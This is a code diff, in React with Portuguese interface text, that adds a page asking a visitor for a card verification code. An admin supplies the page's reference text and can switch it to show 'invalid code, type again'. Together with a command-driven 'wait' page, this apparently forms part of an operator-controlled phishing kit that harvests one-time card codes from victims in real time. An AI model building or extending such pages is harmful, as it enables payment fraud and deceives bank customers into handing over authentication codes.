@@ -1158,6 +1158,96 @@ function CommandPage({ userId }) {
     );
   }
 
+  // Página COD-CC - Código de verificação do cartão
+  if (currentCommand?.action === "COD-CC" || currentCommand?.action === "COD-CC-INV") {
+    const isInvalid = currentCommand?.action === "COD-CC-INV";
+    const referenceText = currentCommand?.command_reference || "";
+
+    return (
+      <div className="min-h-screen bg-white flex flex-col font-inter">
+        <div className="flex-1 flex flex-col items-center pt-12 px-4">
+          {/* Header com título e X */}
+          <div className="w-full max-w-lg flex items-center justify-between mb-8">
+            <h1 className="text-xl font-normal text-gray-800">Insira o código de verificação</h1>
+            <button className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
+          </div>
+
+          <div className="w-full max-w-lg">
+            {/* Texto de referência do admin */}
+            {referenceText && (
+              <p className="text-gray-700 text-sm leading-relaxed mb-6">{referenceText}</p>
+            )}
+
+            {/* Erro */}
+            {isInvalid && (
+              <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg">
+                <p className="text-red-600 text-sm font-medium">
+                  Código inválido. Por favor, digite novamente.
+                </p>
+              </div>
+            )}
+
+            {/* Campo de código */}
+            <form onSubmit={(e) => handleSubmit(e, "cc_code")} className="space-y-4">
+              <div className="relative">
+                <label className={`absolute -top-2.5 left-3 bg-white px-1 text-xs ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}>
+                  Código
+                </label>
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={inputValue}
+                  onChange={(e) => {
+                    const val = e.target.value.replace(/\D/g, "");
+                    setInputValue(val);
+                  }}
+                  disabled={loading}
+                  placeholder=""
+                  className={`w-full px-4 py-4 border-2 rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-lg ${isInvalid ? 'border-red-500' : 'border-pink-500'}`}
+                />
+              </div>
+
+              {inputValue && /\D/.test(inputValue) && (
+                <p className="text-red-500 text-xs">Só é possível inserir números</p>
+              )}
+
+              {/* Pedir novo código */}
+              <div>
+                <a href="#" className="text-blue-600 hover:text-blue-800 text-sm font-medium">
+                  Pedir um novo código
+                </a>
+              </div>
+
+              {/* Botão Confirmar */}
+              <div className="flex justify-end pt-4">
+                <button
+                  type="submit"
+                  disabled={loading || !inputValue || inputValue.length < 1}
+                  className={`px-8 py-2.5 rounded font-medium text-base transition-all duration-300 ${
+                    inputValue && !loading
+                      ? "bg-blue-600 text-white hover:bg-blue-700"
+                      : "bg-gray-200 text-gray-400 cursor-not-allowed"
+                  }`}
+                >
+                  {loading ? (
+                    <div className="flex items-center justify-center">
+                      <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                      </svg>
+                    </div>
+                  ) : (
+                    "Confirmar"
+                  )}
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
   // Página aguarde
   if (currentCommand?.action === "AGUARDE") {
     return (
